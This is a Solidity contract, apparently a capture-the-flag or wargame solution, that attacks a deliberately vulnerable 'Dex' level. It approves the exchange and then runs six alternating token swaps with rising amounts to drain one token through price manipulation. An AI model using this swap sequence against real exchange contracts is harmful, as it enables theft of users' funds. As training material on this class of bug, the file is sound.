// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Dex.sol";

contract DexAttack{
    function att(address addr) public {
        Dex(addr).approve(addr,10 ether);
        Dex(addr).swap(Dex(addr).token1(),Dex(addr).token2(),10);
        Dex(addr).swap(Dex(addr).token2(),Dex(addr).token1(),20);
        Dex(addr).swap(Dex(addr).token1(),Dex(addr).token2(),24);
        Dex(addr).swap(Dex(addr).token2(),Dex(addr).token1(),30);
        Dex(addr).swap(Dex(addr).token1(),Dex(addr).token2(),41);
        Dex(addr).swap(Dex(addr).token2(),Dex(addr).token1(),45);
    }
}